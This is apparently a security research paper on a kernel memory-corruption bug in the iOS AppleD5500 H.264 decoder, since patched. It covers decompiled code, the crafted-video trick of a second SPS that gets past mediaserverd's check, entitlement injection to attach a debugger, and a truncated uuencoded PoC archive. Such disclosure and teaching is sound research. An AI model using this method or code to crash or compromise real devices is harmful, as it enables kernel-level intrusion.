was an exported function with no symbols and no xrefs, but the string
&quot;H264Register&quot; did appear in VideoToolbox. It appears that VideoToolbox
treated H264H8 as a dynamic library and H264Register as the &quot;entry point&quot;
(found with dlsym).

So to actually trigger usage of the driver without having a send right to
the driver, we needed to do the following:

     +----------------------------------------------------------+
     |XPC request to mediaserverd (VTDecompressionSessionCreate)|
     +----------------------------+-----------------------------+
                                  |
                                  v
                   +------------------------------+
                   |dlopen &amp; dlsym to H264Register|
                   +--------------+---------------+
                                  |
                                  v
             +------------------------------------------+
             |AppleD5500WrapperH264DecoderCreateInstance|
             +--------------------+---------------------+
                                  |
                                  v
                       +---------------------+
                       |Utilizing the vtables|
                       +---------------------+
                                  |
                                  v
              +----------------------------------------+
              |AppleD5500WrapperH264DecoderStartSession|
              +----------------------------------------+
                                  |
                                  v
              +---------------------------------------+
              |AppleD5500WrapperH264DecoderDecodeFrame|
              +---------------------------------------+
                                  |
                                  v
                   +-----------------------------+
                   |AppleD5500DecodeFrameInternal|
                   +-----------------------------+
                                  |
                                  v
                     +-------------------------+
                     |IOConnectCallStructMethod| &lt;- driver entry point
                     +-------------------------+

VTDecompressionSessionDecodeFrame is a documented API that checks if we&#039;re
a &quot;server&quot; (e.g, mediaserverd) and does a lot of logic assuming access to
those drivers. Or it just sends a mach message to mediaserverd if we&#039;re not
a server. Despite being &#039;documented&#039;, VTDecompressionSessionDecodeFrame had
a secret undocumented feature which I discovered during reverse engineering
AppleD5500WrapperH264DecoderDecodeFrame (so a much later stage of this
API).

It is possible to embed some properties in the sampleBuffer, in a
dictionary called &quot;tileDecode&quot;:

tileDecodeDict = CMGetAttachment(sampleBuffer, CFSTR(&quot;tileDecode&quot;), 0);

if (tileDecodeDict) {
    cfnum = CFDictionaryGetValue(tileDecodeDict,
            CFSTR(&quot;canvasSurfaceID&quot;));
    uint32_t surfaceID;
    CFNumberGetValue(cfnum, surfaceID);
    ...
    x = ... CFDictionaryGetValue(..., CFSTR(&quot;offsetX&quot;));
    y = ... CFDictionaryGetValue(..., CFSTR(&quot;offsetY&quot;));
    lastTile = CFDictionaryGetValue(..., CFSTR(&quot;lastTile&quot;));
}

The dictionary had 4 properties (or at least, I saw 4 properties):
&quot;canvasSurfaceID&quot;, &quot;offsetX&quot;, &quot;offsetY&quot;, &quot;lastTile&quot;. I had no idea what
these properties meant, but &quot;canvasSurfaceID&quot; sounded perfect for our case:
What if we could supply a surface ID to canvasSurfaceID, and hope that,
magically, this surface will be used in AppleD5500 in the behaviour we saw
previously?

And so it appears - this could indeed influence the behaviour of
mediaserverd and make sure it sends our requested surface object to
AppleD5500!!

This could be verified both by reverse engineering mediaserverd and
following the IOConnectCallStructMethod call, and the buffer given to
AppleD5500, or simply using the kernel tracing technique to see whether the
surfaceID of the object in AppleD5500 matches the surfaceID we sent (which
requires prior reverse engineering of IOSurface.kext).

It could also be performed by calling the function IOSurfaceRoot has to
lookup surface IDs, and see if we get back the value we expect given our
specific surfaceID. Most important thing is - to make sure that this indeed
influenced the given surfaceID. I personally did it by reverse engineering
mediaserverd and following these calls, because I was interested in offsetX
and offsetY as well, though this isn&#039;t necessary (but proved to be useful,
as you&#039;ll see soon ;) ).

--[ 7 - _The_ bug

Back to our main objective, get to that memset with our arbitrary 0x80
write. Looking up the code, I noticed the following:

if ( context-&gt;tile_decode )
{
    dest_surf-&gt;tile_decode = 1;
    tile_offset_x = context-&gt;tile_offset_x;      // [0x1]
    dest_surf-&gt;tile_offset_x = tile_offset_x;
    tile_offset_y = context-&gt;tile_offset_y;      // [0x2]
    dest_surf-&gt;tile_offset_y = tile_offset_y;
    v73 = tile_offset_x +
        tile_offset_y * 
            dest_surf-&gt;surf_props.plane_bytes_per_row[0];   // [0x3]
    v74 = tile_offset_x
        + ((dest_surf-&gt;surf_props.plane_bytes_per_row[1] *  // [0x4]
        tile_offset_y + 1) &gt;&gt; 1)
        + dest_surf-&gt;surf_props.plane_offset_again?[1];     // [0x5]
    dest_surf-&gt;surf_props.plane_offset[0] = v73 +
    dest_surf-&gt;surf_props.plane_offset_again?[0];
    dest_surf-&gt;surf_props.plane_offset[1] = v74;
}
...
if ( !context-&gt;field_4E0 &amp;&amp;
   !(context-&gt;some_unknown_data-&gt;unk &amp; 0x30) ) // [0x6]
{
  surface_buffer_mapping = v85-&gt;surf_props.surface_buffer_mapping;
  if ( surface_buffer_mapping )
    memset_stub(
        (char *)surface_buffer_mapping +
        (unsigned int)*(_QWORD *)&amp;v85-&gt;surf_props.plane_offset[1],
        0x80LL,
        ((dest_surf-&gt;surf_props.plane_height[0] &gt;&gt; 1) *
        (*(_QWORD *)&amp;dest_surf-&gt;surf_props.plane_offset[1] &gt;&gt; 0x20)));
}

The data in [0x1] and [0x2] are completely controlled by the user. These
are the offsetX and offsetY which we provided in the dictionary and they
were forwarded exactly without any check.

It looks like, [0x1] and [0x2] are being used in a calculation that
ultimately leads not only to a write of 0x80s with an arbitrary length, but
also to control the offset from which the write is done! This makes our
primitive much more powerful as we can make our overwrite more accurate.

The values mentioned in [0x3], [0x4] and [0x5] are attributes of the
IOSurface in question, so they are usually somewhat controllable. In this
particular case, the limitations on these attributes pose no restrictions
on the impact of the memset&#039;s primitive. While these attributes aren&#039;t
really within the scope of the paper, for the curious reader, you are
welcomed to reverse IOSurface::parse_properties to see what IOSurface
expects to receive for creation.

One problem I noticed with kernel tracing though, is that we never get to
the memset because of the following condition:

context-&gt;some_unknown_data-&gt;unk &amp; 0x30 // [0x6]

The obvious problem we face here is that there are no sources and these are
actual offsets in a struct and unfortunately there&#039;s no easy deterministic
way to know which object we look at. Looking at the assembly code for this
line, it is decompiled from the following:

; X19 = context
LDR             X8, [X19,#0x448]    ; X8 = context-&gt;some_unknown_data
LDRB            W8, [X8,#6]         ; W8 = unk
AND             W8, W8, #0x30       ; unk &amp; 0x30
CBNZ            W8, skip_memset     ; if (unk &amp; 0x30) goto skip_memset;

Because the offsets weren&#039;t so common (0x448, 0x6), it is possible to
actually grep the entire driver text section and start trying to find the
right reference by grepping. Because this happens pretty often when
reversing IOKit drivers (or reversing &quot;large&quot; binaries anyway), I highly
recommend automating this process. Imagine how good life would be if you
could just grep for &quot;STR *, [*, #0x448]&quot;. It&#039;s not a oneliner in Python,
but for the long run this worths it. For this case however, grepping would
be enough:

$ cat d5500 | grep STR | grep 448 | grep -v SP
0xfffffff006c30448L	STR             D1, [X19,#0xA90]
0xfffffff006c41448L	STRB            W13, [X1]
0xfffffff006c44488L	STRH            W17, [X13,X15,LSL#1]
0xfffffff006c4481cL	STR             W8, [X19,#0x64C]
0xfffffff006c44890L	STRB            W9, [X8,#6]
0xfffffff006c448e8L	STR             W9, [X8,#4]
0xfffffff006c47448L	STRB            W0, [X19,#0x2A0]
0xfffffff006c495ccL	STR             X9, [X10,#0x448]   ; only option
0xfffffff006c50448L	STR             W24, [X22,#0x17BC]

For brevity, I&#039;ll sum this xref looking process for you - it wasn&#039;t
magical, and I made some tools to speed up the process. Sometimes the
offsets are very common and then grepping won&#039;t work - for this case
sometimes the best way is just manually following the code flow. Going
further, I eventually got to this code:

LDR             X11, [X19,#0x1B0]
LDRH            W11, [X11,#0x24]
LDR             X12, [X19,#0x28]
LDRH            W13, [X12,#6]
MOV             W14, #0xFFCF
AND             W13, W13, W14
BFI             W13, W11, #4, #2
STRH            W13, [X12,#6] ; This is the &quot;unk&quot; we were looking for.

I then looked for 0x1B0, which was responsible for this entire calculation,
and then I saw the following string:

&quot;CH264Decoder::DecodeStream error h264fw_SetPpsAndSps&quot;

In the same function, I found another interesting string:

&quot;AVC_Decoder::ParseHeader unsupported naluLengthSize&quot;

--[ 8 - H.264 in general and in iOS

I googled then &quot;AVC nalu&quot; and the first result I got was &quot;Introduction to
H.264: (1) NAL Unit&quot; [6].

I figured, it might be easier to understand a little bit more about H.264
(as I had 0 experience with that before this research). The standard of
H.264 can be found at [7].

The relevant page for NAL unit is section 7.3.1, &quot;NAL unit syntax&quot;. As we
can see from the copy, each NAL unit has a type and is being processed
according to its type (&quot;nal_unit_type&quot;). From all of the different NAL unit
types, there are 3 which are necessary to know:

*) SPS (sequence parameter set): General properties for a coded video
sequence. An example of a property which is held by SPS is the &quot;level_idc&quot;
which is a specified set of constraints that indicate a required decoder
performance.

*) PPS (picture parameter set): General properties for a coded picture
sequence. An example of a property that PPS contains is
&quot;deblocking_filter_control_present_flag&quot; - flags related to the deblocking
filter - a video filter which helps smoothing edges between macroblocks in
the video. Macroblocks are like blocks of pixels (a very rough description,
but good enough for our case).

*) IDR (Instanteous decoding refresh): This is a standalone frame, a
complete picture which doesn&#039;t need other pictures to be displayed. IDR is
always the first NAL in a video sequence (because it&#039;s standalone and other
frames depend on it).

The question is - how to find the appropriate type in the kernel and the
code that processes each NAL unit according to its type? I started 
searching for NAL unit type strings in the kernel (SPS, IDR, PPS, etc), and
found the following piece of code:

LDP             W9, W8, [X19,#0x18]
CBNZ            W9, parse_nal_by_type   ; [0xA]
CMP             W8, #5
B.EQ            idr_type_and_no_idc_ref

parse_nal_by_type
SUB             W9, W8, #1              ; switch 12 cases
CMP             W9, #0xB
B.HI            def_FFFFFFF006C3A2DC
ADRP            X10, #jpt_FFFFFFF006C3A2DC@PAGE
ADD             X10, X10, #jpt_FFFFFFF006C3A2DC@PAGEOFF
LDRSW           X9, [X10,X9,LSL#2]
ADD             X9, X9, X10
BR              X9                      ; switch jump

idr_type_and_no_idc_ref
ADRP            X0, #aZeroNal_ref_id@PAGE ; &quot;zero nal_ref_idc with IDR!&quot;
ADD             X0, X0, #aZeroNal_ref_id@PAGEOFF
BL              kprintf
MOV             W0, #0x131
B               cleanup


As we can see here, &quot;idr_type_and_no_idc_ref&quot; happens &quot;if [X19+0x18] == 0&quot;
(at the [0xA] marker) and if [X19+0x1C]. Checking in the manual, we can see
that for NAL type == 5, we get indeed an IDR NAL. Based on this findings,
we can assume that [X19+0x18] is nal_ref_idc and that [X19+0x1C] is the
type of the NALunit!

Back to our mysterious offset 0x1B0, I started thinking - perhaps it is
either PPS or SPS? The string we found earlier is pretty clear that the
function is doing something with them. I then decoded a video with the API
and using the kernel tracing technique, I looked at the content of 0x1B0 to
see if it looks like something which looks like SPS or PPS. Luckily for us
- this was indeed the SPS object! 

I figured that out because within 0x1B0, All of the values were in fact the
values of the SPS object which is described in the standard (section
7.3.2.1.1 [7], I love you too).

By slightly changing the SPS of the video I was tracing, I saw that the
changes in 0x1B0 were correlated. In fact, most of the SPS object was
stored there in the same order as it appears on the manual :) so this was
even easier once I found the function in the kext which filled up the
object. This was sufficient to understand the mysterious unk &amp; 0x30 check
which means (wait for it):

If SPS-&gt;chroma_format_idc (section 7.3.2.1.1 [7]) == 0, we get to the
memset we were waiting for! At this point, I already had some tools to
create and manipulate videos. So creating a video with chroma_format_idc ==
0 wasn&#039;t a big problem. To send a video for decoding, you first have to call
the function CMVideoFormatDescriptionCreateFromH264ParameterSets which
creates an object that holds information about the SPS and the PPS of the
video. This object is given to mediaserverd to create the session. After
the session is created, we get a handle representing the session, and give
it to *DecodeFrame which ioctls the driver from mediaserverd (see graph
above). I created such a video, sent it to decoding, was waiting for it to
crash the device and... nothing happened!

After a brief reversing of mediaserverd, it appears mediaserverd rejects
chroma_format_idc == 0!

--[ 9 - mediaserverd didn&#039;t read the fucking manual

But...

mediaserverd only gets the SPS information at the beginning in the function
CMVideoFormatDescriptionCreateFromH264ParameterSets which is only being
called once. According to the manual (haven&#039;t seen a single case in
practice though, and I&#039;ve seen plenty of &quot;Snow Monkey in Japan 5k&quot;s during
this research), there could be multiple SPS objects there (section
7.4.1.2.1 in [7]). Which is odd, because if mediaserverd only gets the SPS
and PPS information once, and rejects them, then how it is supposed to be
aware of the other SPS\PPS packets? (*DecodeFrame just passes the packets
to the driver without doing any sanity check).

With this in mind, I decided I&#039;d just try creating a video with a normal
SPS\PPS properties, then in the middle of the video embed a new IDR, which
points to a new PPS, which points to a new PPS with chroma_format_idc == 0,
and see if that bypasses the check deployed in mediaserverd.

                        +------------------------+
                        |          SPS           |
                        | chroma_format_idc &gt; 0  |
                        |seq_parameter_set_id = 1|
                        +------------------------+
                                    |
                                    v
                        +------------------------+
                        |          PPS           |
                        |seq_parameter_set_id = 1|
                        |pic_parameter_set_id = 1|
                        +------------------------+
                                    |
                                    v
                        +------------------------+
                        |          IDR           |
                        |pic_parameter_set_id = 1|
                        +------------------------+
                                    |
                                    v
                        +------------------------+
                        |          SPS           |
                        | chroma_format_idc = 0  |
                        |seq_parameter_set_id = 2|
                        +------------------------+
                                    |
                                    v
                        +------------------------+
                        |          PPS           |
                        |seq_parameter_set_id = 2|
                        |pic_parameter_set_id = 2|
                        +------------------------+
                                    |
                                    v
                        +------------------------+
                        |          IDR           |
                        |pic_parameter_set_id = 2|
                        +------------------------+

The moment the IDR packet with pic_parameter_set_id = 2 was sent, the
kernel crashed with the panic we were expecting! Slightly afterwards, iOS
11 was released. And unfortunately - the same PoC code did not crash the
kernel...

I diffed the driver code but there wasn&#039;t any change. What I did notice
however, is that the string &quot;canvasSurfaceID&quot; did not appear in the binary
of the driver anymore. I did notice that a bunch of undocumented APIs were
introduced then, namely VTTileDecompression* (instead of VTDecompression).
I was too lazy analyzing the function with IDA (to be fair, IDA and
dyld_shared_cache aren&#039;t good friends yet), so I decided to go with a
different approach: try attaching debugserver to mediaserverd, and change
the given values to IOConnectCallStructMethod, hoping that the kernel
crashes if I change it to the same values back in iOS 10.x. Attaching the
debugger obviously doesn&#039;t work out of the box. I assumed both the driver
and the process need the run-unsigned-code entitlement, so without even
checking why things didn&#039;t work, I just injected the entitlement to
mediaserverd and to debugserver and tried attaching debugserver again.

The entitlements&#039; dictionary is stored in
task-&gt;bsd_info-&gt;p_ucred-&gt;cr_label-&gt;l_ptr:

struct task {
	/* Synchronization/destruction information */
	decl_lck_mtx_data(,lock)		/* Task&#039;s lock */
	_Atomic uint32_t	ref_count;	/* Number of references to me */
	boolean_t	active;		        /* Task has not been terminated */
	boolean_t	halting;	        /* Task is being halted */
    ...
	/* Task security and audit tokens */
#ifdef  MACH_BSD 
	void *bsd_info;                 // struct proc
    ...
};

struct	proc {
	LIST_ENTRY(proc) p_list;		/* List of all processes. */

	pid_t		p_pid;			/* Process identifier. (static)*/
	void * 		task;			/* corresponding task (static)*/
	struct	proc *	p_pptr;		 	/* Pointer to parent process.(LL) */
	pid_t		p_ppid;			/* process&#039;s parent pid number */
	pid_t		p_pgrpid;		/* process group id of the process (LL)*/

    ...
	/* substructures: */
	kauth_cred_t	p_ucred;		/* Process owner&#039;s identity. (PUCL) */
    ...
};

struct ucred {
	TAILQ_ENTRY(ucred)	cr_link; 
	u_long	cr_ref;			/* reference count */

struct posix_cred {
	/*
	 * The credential hash depends on everything from this point on
	 * (see kauth_cred_get_hashkey)
	 */
	uid_t	cr_uid;			/* effective user id */
	uid_t	cr_ruid;		/* real user id */
	uid_t	cr_svuid;		/* saved user id */
	short	cr_ngroups;		/* number of groups in advisory list */
	gid_t	cr_groups[NGROUPS];	/* advisory group list */
	gid_t	cr_rgid;		/* real group id */
	gid_t	cr_svgid;		/* saved group id */
	uid_t	cr_gmuid;		/* UID for group membership purposes */
	int	cr_flags;		/* flags on credential */
} cr_posix;
	struct label	*cr_label;	/* MAC label - contains the dictionary */
	/*
	 * NOTE: If anything else (besides the flags)
	 * added after the label, you must change
	 * kauth_cred_find().
	 */
	struct au_session cr_audit;		/* user auditing data */
};

struct label {
	int	l_flags;
	union {
		void	*l_ptr;
		long	 l_long;
	}	l_perpolicy[MAC_MAX_SLOTS];
};

This time it worked! First, I took an iOS 10.x device, triggered the
problematic flow, and put a breakpoint just before the
IOConnectCallStructMethod function (which is the actual ioctl to the
driver). I knew that this works, so I just copied the entire input buffer
to the IOConnectCallStructMethod.  I then called the corresponding
functions (same API, but changed the VT prefix to VTTile) and set a
breakpoint again. Once I reached IOConnectCallStructMethod, I simply
overwrote the entire input buffer and replaced it with the input buffer
I copied from the iOS 10.x device. The kernel crashed! From there, it was
easy to reverse engineer backwards from IOConnectCallStructMethod and see
that the 6th parameter given to VTTileDecompressionSessionDecodeTile is
simply the X and Y offsets shifted so that they fit in a 64 bit integer
(each one of the offsets is a 32 bit integer).

Apple eventually fixed the bug by checking in the kernel for out of bounds
before performing the write. They re-verified the values once again in 
AppleD5500.kext. If you would like to find the actual code where Apple
introduced the checks, you can search up the kernel for the following
string as this is now printed when putting bad arguments:

&quot;bad IOSurface* in tile offset check&quot;

After this string there&#039;s a series of checks for the attributes of the
IOSurface object.

--[ 0xA - Takeaways

*) I&#039;ve just displayed one vulnerability in an attack vector accessible
from within the sandbox. Parsing video and making sure there aren&#039;t
mistakes isn&#039;t that easy, and it&#039;s all done from within the kernel! It&#039;s
obvious that there are more vulnerabilities in this driver, and in other
codecs in iOS as well. The attack surface is (sometimes) more important
than the vulnerabilities, and I think this is a good example because
nowadays it is not _that_ common to find simple buffer overflows.

*) Manuals are super important. Often when reversing drivers, it is easy to
fall for looking for patterns (looking for integer overflows, races,
appropriate refcounts, etc). Understanding what we actually reverse and not
just looking blindly for patterns was the only reason I thought about
putting two SPS in the same packet. I didn&#039;t try &quot;bypassing&quot; mediaserverd,
I just understood that SPS has an ID, and hence it is likely that there can
be more than one of them. Maybe it wasn&#039;t the reason I found the
vulnerability this time, but that happens as well.

*) Infrastructure is super helpful. Sometimes people can get lazy writing
tools, but these might be helpful eventually, even if it takes a lot of
time writing them (the kernel patching technique was really easy to write,
but I did find myself writing a single tool for a few days just to have
things easier when researching). It&#039;s an investment for the long term, but
without the kernel tracing technique I would have probably given up
already. I had so many assumptions which were mandatory to verify, and it
was very easy thanks to the kernel tracing technique.

--[ 0xB - Final words

I&#039;m not sure how you readers feel about this paper, but from section 7 till
the first crash, it took me about a week. I tried to put as much details as
I could into that paper, but unfortunately sometimes you either forget or
ignore details. While it was time consuming and some experience IS needed
for that, I&#039;m trying to show you that it is not impossible to actually find
bugs (good, reachable from the sandbox bugs). I highly encourage you to
stop mentally masturbating about iOS bugs and just throw a freakin&#039;
kernelcache into IDA and just start reversing. It&#039;s much easier than it
looks! We&#039;re still in the era where someone can drag a kernelcache into IDA
and have a good bug within 2 weeks. Remember my words, in 5 years we&#039;ll
miss these days, where we can completely wrap up such a project within a
month.

Additionally, I would like to thank Zimperium for letting me doing this
research. It is not always easy for a company to simply let a single person
to do his own research on the internals of a video decoder driver, hoping
that when he says there&#039;s something coming up, something actually comes up.

P.S. - I did start working on an exploit, and then more important things
had priority over it. Hence some of the attached code might be redundant.

Sincerely yours,
Adam Donenfeld, aka @doadam.

--[ 0xC - References

[1] https://nvd.nist.gov/vuln/detail/CVE-2018-4109
[2] https://nvd.nist.gov/vuln/detail/CVE-2015-7006
[3] https://developer.apple.com/documentation/iokit
[4] https://github.com/kpwn/yalu102
[5] https://xerub.github.io/ios/kpp/2017/04/13/tick-tock.html
[6] https://yumichan.net/video-processing/video-compression/
    introduction-to-h264-nal-unit/
[7] https://www.itu.int/rec/T-REC-H.264

--[ 0xD - Code

begin 664 src.tar.gz
M&#039;XL(&quot;#8LOUL&quot;`W-R8RYT87(`[%Q[=]LVLL^_TJ=`FG,:*W7T\&quot;O)=;&gt;M(LN-
M-K+D*\EI&lt;WKVZ%`D9.&amp;:(E4^+&amp;MW^]WOS`&quot;D0!*4W;1)S]UKM;$M8O##8&amp;8P
M&amp;`P`AH&#039;=&gt;/*9/TWXO&#039;IUC+];KXZ;^N_D\Z1U&gt;&#039;C\ZN3@I-D&quot;NE;S\.#P&quot;3M^
M\@4^&lt;1A9`6-/K.!ZM8ONOO+_HY\0]-\;OA=1XS/K__CWZ+]U&quot;(\&gt;]?]%]3\&lt;
M7_`PM*[YP(_$7-A6)&#039;ROOOB3]&#039;]R=%2B_U;SX.@@I__CDZ/C)ZSYJ/_/_FF\
MJ+(7K..O-H&amp;X7D1LSZZQUILWKU\&gt;@&amp;I8&gt;[5R.90N5W&#039;$@WW6\^PZ:[LN(^*0
M!3SDP2UWZ@&quot;&quot;.#^T+R_[W&gt;EP/.J&gt;=T?=0:&lt;[[?&lt;ZW&lt;&amp;X.WW7;9]U1]/QI#V:
M_(&quot;T^&amp;^R$&quot;&amp;;&quot;VC#]KW($E[(A@`M/,N%5AW.+,]I^`&amp;[\)W4)$/FS[-4B&amp;2%
MS.%SX7&amp;&#039;&quot;0^KL6AA1&lt;P*.`OCV?]P.V*1#\^XZM-E/&#039;.%S&lt;9^&#039;-B&lt;]87-O9&quot;`
M/O`@A%;80;W)]I#^N2I\7JNSCW[,EM:&amp;&gt;7[$XI`#7L(_O[/Y*H*V$&lt;,&amp;@;G&quot;
M\@!Y+:(%-:M0ZM!GGHCO.K&quot;\&quot;#@&amp;SC:`&#039;&#039;L.#W1BQ$J:FW%LD6CM@%L1WV&lt;@
M&amp;.Y9,Y=3&#039;7J*G,/C@#LBC`(QB^63^3Y&quot;Q9YKK&gt;&gt;QBQ3PMVS#`6Y7@I-4+4])
MQU_Q`,&quot;\:Q9NPH@OJ:W(I[Z)P(Z7M]R+]MFM\%T3)RF)8D?2*4Z@E0T&quot;@4$M
M=[?*0G\&gt;K5&amp;%BE=F70&gt;&lt;+P&amp;XGEC0I&lt;LM*/!G:#W,PLYL$%23(K,BI%Q$T&gt;J_
M&amp;HWU&gt;EV&#039;AKR0-%^WL.4Z**QAK4*W098#@@0K0I&#039;/_0#%CBREJJYOC9&lt;7K959
M,#I2OE,M@)@+VD7C1!R=R$?;9&lt;_;8]8;/V&lt;S*Q3A/ONI-WDWO)JPG]JC47LP
M^&lt;B&amp;YZP]^,C&gt;]P9G^ZP+I=T1`G5_OAQUQV,V&#039;+&#039;&gt;Q66_UX72]N&quot;,T:!D0-1]
M^Y&amp;=]&lt;:=?KMW,6;M?I^-KSKO$MQ&gt;=TQFTAMT^E=GO&lt;&amp;/:&lt;/]WD5OTI[TAH-]
M:GA;`5FYZ(XZ[^!K^VVOWYM\)(SSWF2`K)P#+VUV&quot;6.^U[GJMT?L\FIT.1QW
M]]E_7_6Z$]8=_&#039;WX\:([F&quot;#3@^&#039;@96]P/H*FN_BLKBDXY#PCN[DO91FNN(VN
M@;F6=QW#[,6N_5L&gt;&gt;*@R-&lt;I`*PCDBJ6(E`&lt;IZ&quot;)5ZOT&gt;K#LX0__5J):XSC=F
MKVETFTSYS7&gt;]\60X^BB_-:K59V(.&#039;,XK4V`$_K\`4;9_[`Z&amp;D]YYKT.*F+ZK
M/I,.C^TD0BB@`R)[Y&lt;8A_JOR.V#+8U]UOF+_JC[C&#039;OA6I/-L-P8C_G9IV8L&amp;
M_IA&amp;FQ4/ZXOOM$*&#039;WX+$&amp;O*7B4`&amp;$[WAB$=QX&amp;%9E7OQ$EIB\+DY%T$8$8T&gt;
M9DP`AU4J?V.M9G-?$O:&amp;8Y`1-$*&gt;.EP\E/S&quot;BNP%=_+DDKJ5IYZ`$X+Q&amp;QDJ
M(/U!2M\.-YZ-*G4Y4ACACXO,%&quot;.JE/HDH&gt;Y;Y1)!PC=OJK^=9J4X&#039;.NTJI7&gt;
M&amp;9(?&#039;^XG-#K//$OT2A%=6&#039;=$U0ZN0]G:2:$QU?F1,MH&gt;6.8=`]+FOK&amp;\X\&lt;P
M-U2S@@.OZ,?1&gt;&gt;S9:?62&gt;H9J(SZ&#039;\(`J&amp;LMS+9(%P/C/-WIOF[F*IF9S)%K]
MA*(&#039;,SJ,[^AWMYZK:&amp;H]1Z*,;&quot;&lt;-M4$JK58;#?8R\\G9E&amp;)N?G)$M8#CU_O%
MLK&#039;X)R?]%2J`(]O;$UY48R&#039;0^/,]X4\A9@FF`9\#3QXZC%H-F4&amp;_@5[)0,&quot;V
ML/+1R=$OQ:;^`1V&quot;63.VD5X?&quot;^]@[N;!R9&#039;J%;FQ97@]18ZF405_G58JC1&lt;4
M&lt;$(@0:RBST5J&lt;`1Q8+E`5T$.3^EAD9]*RNXI^=&lt;D\MR;0GA[UIE^Z([&amp;Z&#039;VG
M-?;UUZSPE&#039;U&#039;@_I-L]6O40NQ%XIKC%SMA154%&amp;._0!&gt;?&lt;1&gt;#P%*2)M&amp;0_T8-
M/UL%UO728BO+OMD[JB4&quot;2KU1:AJR&gt;BHDK=M+Z24F:&gt;\-&amp;DJ(P&amp;?$&amp;(O]T@(V
MH/U,\S6#M9&amp;LGK[OC@;=_O1JW!T=&#039;E1+3+#&lt;`!/S@[J:(:5=**CKESSJ/:;S
M^0SG/\1L&quot;D93L)E;7SCLQ0/-1&#039;&#039;&quot;0+(9RV`4&quot;*6\Y.;?+&quot;])M(&amp;!5&gt;Q&amp;IW^&amp;
M=&amp;4G($:_#G_Y!X1/5J2&quot;=*#=VT/FN5.KZ&lt;+6:S1W5]G*7@9ZF?`LL&gt;E=1FIZ
M&gt;)JO6:K!L@(#0HG&lt;RPI.M7BR$&#039;?^MBU,=;XS&gt;B43&gt;/+X^2+YO]YP(J/YSY+_
MW9&#039;_.SQHM7+YO\-F\_`Q__=7Y_].&#039;O-_C_F_Q_S?8_[O,?]GRO]MDW0P@?8F
M\&#039;/R\;([SF3F\B5IP$&lt;%*2%]8RTM+GHJ&#039;\ED8#8S)\/J;-:-2FZ7VX3&lt;[HS&lt;
MPY.&quot;LHN#JWY?#ZHQ?DZKUI)N$%FEJ4+BI&amp;_X$,)?&amp;1W7FK4$7/VJJ#SJ6&amp;`H
MR1PKLICLA2YD8/6BW9%2G.(JK`-V9]DJ8LD2:E37,0BK7J\C+=.(-&gt;F$D3/S
M?3&lt;K3E?,;D`:C&gt;%XLA5HJINT&quot;6I7&gt;[QED1I)H^DKB+,/#RJ5WG&quot;X0@-\*Z)P
M&amp;VN/T])S&lt;&lt;&gt;=4T,U-2F9BGK@*&amp;E=FR]D#$H[8!&lt;&lt;9D]&lt;&lt;N;J8O&#039;;3&lt;2I\N%!
MMOK)4;;\Y*@(T!M&gt;+C8AS,INVW$@$@@-(`4:!&quot;K%Z7/O.EKLA)$DQ$YJQ/W+
MDZ/I-*U#2W&lt;8&quot;Y9L$5:H($`11&#039;&#039;*1+)J2VIDB(W4Z7#0EI6R65I.)@_E&quot;K:6
M`F&lt;D6-$%FF&lt;AHXNL[+?M;XFS&#039;,HU&lt;-^_U@1]^CO8U8`+ZJH4&#039;YX:Z!.]5`K/
M3C4OEY0&lt;&#039;NRQA=AGKL]JE&lt;K&gt;GE1S#;]_P]*O&gt;PM18]]^RPX/:K4&lt;&quot;&amp;:!*B=&#039;
M527%\@Z@,&#039;]&#039;![+D#^Z`ZQL9Q/Q6HKO&lt;TKJ:9&quot;YRK%6LA$59G%I!I&gt;(J;G[3
M:HU@UM/&#039;MEJWI^A9.WD@N*J48)&gt;-LRPA6*QJ1=4CS=!4EM1$IVAFM#AD,YPF
MQ2H7I_.:;S.=/_5&amp;U11S8:T@IHO6G&#039;OL63*34&gt;@:+Y]C&#039;.S!6M&quot;3$0.$IW&lt;1
M#)30#@3Y;#D=Y=C_5[4BO(C=6FX,K5&lt;(@7)M[(5G+;ED&lt;0!_.1\D2&lt;H*7_K!
M!H)%&lt;&gt;UA/,M&gt;ODQ&quot;&amp;&gt;`)%C,66_EKB%$PE%W[V&lt;;3K!ZTC6)/0%!7J1%.&lt;=Z=
M?KB83MKC]SC&amp;,#JPPIMIA&#039;-PPL=E#.$J!,XH8:R7AE-A%,_GLMEJHY$/)A3Y
M-F?PW3:R@4GPW51Z%CV_)2.AR^%H,IZ&gt;=&lt;][@^X9V%(^4LJ79WSZR@\B4+_P
MISZMZ*;1:6;Z-4+DION2_4M]1R(!QX9`HYYJJ80&quot;C0&gt;7+7ZP@TA$]Y($_!K7
M`1L`Q)_EA*%,W4TU=8,13(=O_][M3$CKH&amp;RM3HTU,UE633]*NV`M&#039;=E/&amp;&quot;&#039;*
M,I?TB[2;VPP\XW,K=J.+E`&quot;W`@V;AHJ.(I!*9KNPYRW$3&amp;Q+MKNR/P4@J&lt;DB
MB-.R[0XLYBAFEGV3%AUFJW7\Y0QD(8O_QHZ()&gt;I&lt;TB58Z^&amp;RP*?QG.\6=+WM
M;=8+&#039;DAN[]3)Q):^L;B2\10,(XWFE;8)G9&quot;,%V(&gt;5;0-#&quot;K*BR0G)48?F/#R
M0#I&amp;7G@Y&gt;3X((R?FOQ5%_P&quot;0@C[R.GHP)SG-F11JQM&amp;`KF!8R.`Z)/6DVIG/
MYQG&quot;$2SNAYZ[V2JPU40%:B1C7&quot;;:BJ`ES6`_`Y&#039;LZ$B2@R+)E2=^C9/R(UDN
M#?+%4_8#6=X8IF_.SBT;_$)(57]P1&amp;C&#039;(:6?KC`S`]:(.8T0*:=SHF0K*X#Y
M!/P)$YA_^S46@&lt;P**4]JP?0@(IHWQ!+7M0B&lt;3&amp;WL9F!Y?LCANR/;ES\5-BZJ
MO90`TP\(#3!A`&gt;=&quot;V,%NH.66XAXDUQ7W(*44.Y$FPKXI@:!4`5`Y5@&quot;+5]#I
MNW_6`,6^*8&quot;,=W%B8()\J.Y*\A)F6P=7$!J=8&amp;FFI3E!R%*8I34BG3WZ9(BR
MM%MYL(1V+P/00.J:LDO*6H+ASX0KHHU&lt;@V&gt;7L7K&lt;P=!UX3PTB)&lt;SW&#039;MZ\([/
MTV):!)MYW(KYR_=_D@31%][_.3DZR9__/VR=O&#039;K&lt;__FK]W\.&#039;O=_&#039;O=_&#039;O=_
M&#039;O=_&#039;O=_RL]_;X]N-ZHL/1,&gt;\.VA),H.0:`XA/:&quot;D`;T#*-*&quot;&amp;LWB=.J9\Y]
M:Q&#039;2J#NY&amp;@V,&gt;TIIT:&gt;&gt;\&gt;9!X`=Z]J.&quot;FQ[3@-B6F7#9!&gt;V@$HS,J?!O1)0R
